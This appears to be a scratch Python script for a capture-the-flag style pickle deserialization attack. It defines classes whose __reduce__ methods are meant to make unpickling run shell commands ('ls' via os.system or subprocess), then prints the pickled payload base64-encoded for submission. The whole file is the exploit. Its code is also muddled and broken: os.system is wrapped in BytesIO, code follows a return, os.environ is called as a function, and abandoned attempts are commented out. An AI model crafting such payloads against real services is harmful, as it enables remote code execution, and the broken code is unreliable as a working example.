import pickle
import base64
from io import BytesIO

import os

class Phreaks:
#    def __init__(self, hacker_handle, category, id):
#        import subprocess
#        import os
#        #self.hacker_handle = hacker_handle
#        #self.hacker_handle = subprocess.check_output, (['ls'],)
#        cmd = 'ls system'
#        #return (subprocess.check_output, (['ls'],))
#        self.hacker_handle = (subprocess.check_output, (['ls'],))
#        self.category = (subprocess.check_output, (['ls'],))
#        self.id = (print(os.popen("ls -l").read()))
    def __reduce__(self):
        import os
        return (BytesIO(os.system, ('ls', )))
        cmd = ['ls']
        #return os.system, (cmd,)
        #return subprocess.check_output, (cmd,)
        import subprocess
        import os
        return (os.environ,(cmd,))
class Phreaks2:
    def __reduce__(self):
        cmd = ['ls']
        #return os.system, (cmd,)
        #return subprocess.check_output, (cmd,)
        import subprocess
        import os
        return (os.environ,(cmd,))


if __name__ == '__main__':
    #pickled = pickle.dumps(Phreaks('test', 'rev', 0))
    pickled = pickle.dumps(Phreaks())
    #pickled = pickle.dumps(Phreaks2())
    print(pickled)
    print(base64.urlsafe_b64encode(pickled))